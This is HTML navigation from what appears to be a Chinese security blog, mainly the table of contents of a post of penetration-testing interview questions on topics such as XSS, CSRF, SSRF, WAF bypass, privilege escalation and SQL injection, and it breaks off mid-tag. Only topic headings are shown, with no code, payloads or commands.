class="avatar-img" src="https://s3.ax1x.com/2021/01/15/s010Z4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Mengd@</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Kumengda"><i class="fab fa-github"></i><span>访问我的github</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is Mengd@ Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">自我介绍:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">渗透测试流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%B3%9B%E8%A7%A3%E6%9E%90-%E5%9C%A8%E5%A4%84%E7%90%86%E5%AD%90%E5%9F%9F%E5%90%8D%E7%88%86%E7%A0%B4%E6%97%B6%E6%B3%9B%E8%A7%A3%E6%9E%90%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">什么是泛解析,在处理子域名爆破时泛解析应该如何处理?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#protobuf%E7%9B%B8%E5%85%B3"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">protobuf相关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastjson"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpinfo%E5%85%B3%E6%B3%A8%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="toc-number">1.0.0.6.</span> <span class="toc-text">phpinfo关注的信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%B4%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E6%84%9F%E8%A7%89%E4%B8%8D%E9%94%99%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.0.7.</span> <span class="toc-text">说一个自己感觉不错的漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E5%88%B0href%E7%9A%84XSS%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.0.8.</span> <span class="toc-text">输出到href的XSS如何防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SameSite%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1CSRF%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.0.9.</span> <span class="toc-text">SameSite如何防御CSRF攻击?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.0.0.10.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jsonp"><span class="toc-number">1.0.0.11.</span> <span class="toc-text">Jsonp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Jsonp%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.0.12.</span> <span class="toc-text">Jsonp防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF%E6%9B%B4%E5%A5%BD%E7%9A%84%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B-%E5%85%B7%E4%BD%93%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.0.0.13.</span> <span class="toc-text">CSRF更好的防御方式有哪些?具体如何实现?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON%E6%A0%BC%E5%BC%8F%E7%9A%84csrf%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.0.14.</span> <span class="toc-text">JSON格式的csrf如何防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.0.0.15.</span> <span class="toc-text">浏览器解析顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">1.0.0.16.</span> <span class="toc-text">浏览器解码顺序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88html%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E8%83%BD%E5%A4%9F%E9%98%B2%E8%8C%83XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.0.17.</span> <span class="toc-text">为什么html实体编码能够防范XSS漏洞?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-%E5%BC%B9-alert-%E6%9C%89%E9%82%A3%E4%BA%9B%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.0.18.</span> <span class="toc-text">XSS 弹 alert 有那些方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-DOM-%E5%8F%8D%E5%B0%84%E5%8C%BA%E5%88%AB-%E8%87%AA%E5%8A%A8%E5%8C%96%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.0.19.</span> <span class="toc-text">XSS,DOM,反射区别,自动化防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E5%87%BA%E7%8E%B0%E7%9A%84%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.0.0.20.</span> <span class="toc-text">XSS出现的根本原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.0.0.21.</span> <span class="toc-text">XSS防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MXSS-%E7%AA%81%E5%8F%98xss"><span class="toc-number">1.0.0.22.</span> <span class="toc-text">MXSS(突变xss)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0"><span class="toc-number">1.0.0.23.</span> <span class="toc-text">伪随机数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PythonSSTI%E7%9B%B8%E5%85%B3%E8%AF%B4%E8%BE%9E"><span class="toc-number">1.0.0.24.</span> <span class="toc-text">PythonSSTI相关说辞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E5%8D%95%E4%BD%8D%E7%9A%84%E4%B8%80%E7%BA%A7%E5%9F%9F%E5%90%8D%E5%8F%AF%E8%83%BD%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%80%8E%E4%B9%88%E6%94%B6%E9%9B%86%E6%9F%90%E4%B8%AA%E5%8D%95%E4%BD%8D%E7%9A%84%E6%89%80%E6%9C%89%E5%9F%9F%E5%90%8D%EF%BC%8C%E6%B3%A8%E6%84%8F%E4%B8%8D%E6%98%AF%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">1.0.0.25.</span> <span class="toc-text">一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8-%E8%BF%87%E6%BB%A4-%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.0.0.26.</span> <span class="toc-text">sqlmap高级使用(过滤,条件)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF-%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.0.27.</span> <span class="toc-text">SSRF 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.0.28.</span> <span class="toc-text">DNS重绑定原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%AD%E7%BD%91%E5%9D%80%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.0.29.</span> <span class="toc-text">短网址原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%90%88%E9%9B%86"><span class="toc-number">1.0.0.30.</span> <span class="toc-text">SSRF伪协议合集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E5%88%A9%E7%94%A8-%E6%9C%80%E5%A4%A7%E7%A8%8B%E5%BA%A6%E5%88%A9%E7%94%A8-%E8%BF%9B%E5%86%85%E7%BD%91-%E6%8B%BFshell"><span class="toc-number">1.0.0.31.</span> <span class="toc-text">SSRF利用,最大程度利用,进内网,拿shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E5%88%B0getshell"><span class="toc-number">1.0.0.32.</span> <span class="toc-text">SSRF到getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF%E6%80%8E%E4%B9%88%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.0.0.33.</span> <span class="toc-text">SSRF怎么修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python-%E7%9A%84%E8%A3%85%E9%A5%B0%E5%99%A8%EF%BC%8C%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%8Cyield"><span class="toc-number">1.0.0.34.</span> <span class="toc-text">python 的装饰器，迭代器，yield</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RASP%E9%98%B2%E5%BE%A1-%E7%BB%93%E5%90%88sql"><span class="toc-number">1.0.0.35.</span> <span class="toc-text">RASP防御,结合sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%BA%95%E5%B1%82%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.0.0.36.</span> <span class="toc-text">PHP底层如何判断变量类型?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87WAF%E5%B8%B8%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.0.37.</span> <span class="toc-text">绕过WAF常用方式?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%AC"><span class="toc-number">1.0.0.38.</span> <span class="toc-text">富文本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%ACXSS%E5%92%8C%E9%9D%9E%E5%AF%8C%E6%96%87%E6%9C%ACXSS%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F%E5%8C%BA%E5%88%AB"><span class="toc-number">1.0.0.39.</span> <span class="toc-text">富文本XSS和非富文本XSS修复方式区别?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#websocket%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.0.40.</span> <span class="toc-text">websocket链接过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9B%B6%E4%BF%A1%E4%BB%BB"><span class="toc-number">1.0.0.41.</span> <span class="toc-text">零信任</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-HIDS-NIDS"><span class="toc-number">1.0.0.42.</span> <span class="toc-text">入侵检测:HIDS,NIDS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ddos%E7%B1%BB%E5%9E%8B-%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.0.43.</span> <span class="toc-text">ddos类型,如何防御?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E4%B8%BA%E6%AD%A3%E5%B8%B8%E7%94%A8%E6%88%B7"><span class="toc-number">1.0.0.44.</span> <span class="toc-text">如何判断用户是否为正常用户</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E5%A6%82%E4%BD%95%E5%81%9A%E9%9A%90%E7%A7%81%E4%BF%9D%E5%AF%86"><span class="toc-number">1.0.0.45.</span> <span class="toc-text">企业内部如何做隐私保密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-disablefunction%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.0.46.</span> <span class="toc-text">php disablefunction绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java-php-python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%8C%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">1.0.0.47.</span> <span class="toc-text">java&#x2F;php&#x2F;python反序列化产生原因，如何防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#https%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B"><span class="toc-number">1.0.0.48.</span> <span class="toc-text">https详细过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CDN%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.0.49.</span> <span class="toc-text">CDN绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux-windows%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.50.</span> <span class="toc-text">linux&#x2F;windows提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AAurl%E8%BF%87%E7%A8%8B%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%EF%BC%8C%E5%8F%AF%E8%83%BD%E4%BC%9A%E4%BA%A7%E7%94%9F%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-https%EF%BC%8C%E4%B8%AD%E9%97%B4%E4%BA%BA"><span class="toc-number">1.0.0.51.</span> <span class="toc-text">浏览器输入一个url过程是什么样的，可能会产生哪些安全问题(https，中间人)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log4j%E6%9C%89%E5%85%B3"><span class="toc-number">1.0.0.52.</span> <span class="toc-text">Log4j有关</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struct%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.0.0.53.</span> <span class="toc-text">Struct执行流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XXE"><span class="toc-number">1.0.0.54.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B%E6%84%8F%E4%B9%89%E5%8F%8A%E5%8E%9F%E7%90%86"><span class="toc-number">1.0.0.55.</span> <span class="toc-text">JNDI解析流程意义及原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shiro%E5%88%A4%E6%96%AD%E5%AF%86%E9%92%A5%E6%98%AF%E5%90%A6%E6%AD%A3%E7%A1%AE"><span class="toc-number">1.0.0.56.</span> <span class="toc-text">shiro判断密钥是否正确</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%B8%B8%E8%A7%81cms%E7%9A%84%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.0.57.</span> <span class="toc-text">PHP常见cms的方法调用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Thinkphp5%E8%B7%AF%E7%94%B1%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.0.58.</span> <span class="toc-text">Thinkphp5路由设计思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E8%87%AA%E5%B7%B1%E7%9A%84%E5%B7%A5%E5%85%B7-idea%E7%9A%84dnslog%E6%8F%92%E4%BB%B6-nmap%E6%89%AB%E6%8F%8F%E5%99%A8-%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E6%8F%92%E4%BB%B6%E7%AD%89"><span class="toc-number">1.0.0.59.</span> <span class="toc-text">介绍自己的工具(idea的dnslog插件,nmap扫描器,语义分析插件等)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%BB%BD%E4%BB%A3%E7%A0%81-%E5%A6%82%E4%BD%95%E4%B8%8B%E6%89%8B"><span class="toc-number">1.0.0.60.</span> <span class="toc-text">拿到一份代码,如何下手</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E8%BF%99%E4%B8%AA%E7%AB%99%E6%98%AF%E5%93%AA%E4%B8%80%E4%B8%AA%E6%A1%86%E6%9E%B6%E5%86%99%E7%9A%84-%E6%9C%89%E6%BA%90%E7%A0%81-%E6%97%A0%E6%BA%90%E7%A0%81-%E5%AE%A1%E8%AE%A1%E5%9F%BA%E4%BA%8E%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91%E7%9A%84%E4%BB%A3%E7%A0%81%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E4%BB%80%E4%B9%88-%E5%9C%A8%E5%AE%A1%E8%AE%A1%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%92%8C%E5%AE%A1%E8%AE%A1%E4%B8%8D%E5%B8%A6%E6%9C%89%E6%A1%86%E6%9E%B6%E7%9A%84%E4%BB%A3%E7%A0%81%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB-%E5%85%B3%E6%B3%A8%E7%82%B9%E4%B8%8A%E6%9C%89%E4%BB%80%E4%B9%88%E4%B8%8D%E5%90%8C"><span class="toc-number">1.0.0.61.</span> <span class="toc-text">如何判断这个站是哪一个框架写的(有源码,无源码),审计基于框架开发的代码需要注意什么?在审计过程中和审计不带有框架的代码有什么区别?关注点上有什么不同?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%80%E5%A7%8B-%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-number">1.0.0.62.</span> <span class="toc-text">反序列化开始,入手点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%86%85%E7%BD%91%E6%9C%BA%E5%99%A8%E8%AF%B7%E6%B1%82%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.0.0.63.</span> <span class="toc-text">利用内网机器请求内网服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E6%80%8E%E4%B9%88%E6%89%BE"><span class="toc-number">1.0.0.64.</span> <span class="toc-text">PHP代码常见入口函数怎么找?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-php%E4%B8%A4%E4%B8%AA%E7%AD%89%E5%8F%B7%E5%92%8C%E4%B8%89%E4%B8%AA%E7%AD%89%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB-%E5%BA%95%E5%B1%82%E5%9B%9E%E7%AD%94"><span class="toc-number">1.0.0.65.</span> <span class="toc-text">PHP变量覆盖,php两个等号和三个等号的区别(底层回答)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#redis%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.0.0.66.</span> <span class="toc-text">redis利用方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.0.67.</span> <span class="toc-text">任意文件下载如何利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REC%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.0.68.</span> <span class="toc-text">REC不出网,利用思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AF%B9%E5%BA%94%E7%9B%AE%E6%A0%87%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.0.0.69.</span> <span class="toc-text">判断对应目标用了什么数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.0.70.</span> <span class="toc-text">防止重放攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT%E4%BB%A4%E7%89%8C"><span class="toc-number">1.0.0.71.</span> <span class="toc-text">JWT令牌</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AJAX%E5%8F%91%E9%80%81POST%E5%8F%91%E9%80%81%E5%87%A0%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">1.0.0.72.</span> <span class="toc-text">AJAX发送POST发送几个数据包?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AJAX%E5%A6%82%E4%BD%95%E5%8F%91%E9%80%81post%E8%AF%B7%E6%B1%82"><span class="toc-number">1.0.0.73.</span> <span class="toc-text">AJAX如何发送post请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90fortify-seay%E7%AD%89-%E4%BD%BF%E7%94%A8%E8%BF%87%E5%90%97-%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.0.0.74.</span> <span class="toc-text">自动化代码分析fortify,seay等,使用过吗,原理是什么?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windows%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.0.0.75.</span> <span class="toc-text">windows横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB%E5%A6%82%E4%BD%95%E6%8B%BFwebshell"><span class="toc-number">1.0.0.76.</span> <span class="toc-text">站库分离如何拿webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux-windows%E5%91%BD%E4%BB%A4-%E8%BF%87%E6%BB%A4%E6%96%87%E4%BB%B6-%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-%E7%9C%8B%E8%BF%9B%E7%A8%8Bpid"><span class="toc-number">1.0.0.77.</span> <span class="toc-text">linux,windows命令:过滤文件,查看进程环境变量,看进程pid</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Python%E5%A4%9A%E7%BA%BF%E7%A8%8B-python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%94%81"><span class="toc-number">1.0.0.78.</span> <span class="toc-text">Python多线程,python多线程锁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8Bwebshell"><span class="toc-number">1.0.0.79.</span> <span class="toc-text">如何检测webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webshell%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.0.80.</span> <span class="toc-text">webshell检测绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.0.81.</span> <span class="toc-text">攻击溯源思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.0.0.82.</span> <span class="toc-text">DNS协议安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CORS"><span class="toc-number">1.0.0.83.</span> <span class="toc-text">CORS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E8%BF%87%E6%AF%94%E8%BE%83%E9%9A%BE%E7%9A%84CTF%E9%A2%98%E7%9B%AE"><span class="toc-number">1.0.0.84.</span> <span class="toc-text">遇到过比较难的CTF题目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CTF%E7%BB%8F%E5%8E%86%EF%BC%9A"><span class="toc-number">1.0.0.85.</span> <span class="toc-text">CTF经历：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E4%BA%ABtrick"><span class="toc-number">1.0.0.86.</span> <span class="toc-text">分享trick</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%B1%BB"><span class="toc-number">1.1.</span> <span class="toc-text">sql注入基础类:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql8%E6%96%B0%E7%89%B9%E6%80%A7table-value"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">mysql8新特性table&#x2F;value</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E7%88%86%E5%BA%93-%E8%A1%A8-%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">sql注入爆库,表,字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">sql注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">dnslog外带数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">dnslog原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">如何防御</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">1.1.0.6.1.</span> <span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#waf"><span class="toc-number">1.1.0.6.2.</span> <span class="toc-text">waf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E8%BF%94%E5%9B%9E%E7%9A%84%E5%80%BC%E8%BF%9B%E8%A1%8C%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.0.6.3.</span> <span class="toc-text">对返回的值进行过滤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%87%E5%88%B0order-by%E6%80%8E%E4%B9%88%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">遇到order by怎么防御</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E9%98%B2%E5%BE%A1%E6%97%B6%E9%81%87%E5%88%B0%E5%88%97%E5%90%8D%E6%88%96%E8%80%85%E8%A1%A8%E6%98%8E%E5%B0%B1%E5%B8%A6%E6%9C%89%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%BA%94%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">1.1.0.9.</span> <span class="toc-text">转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 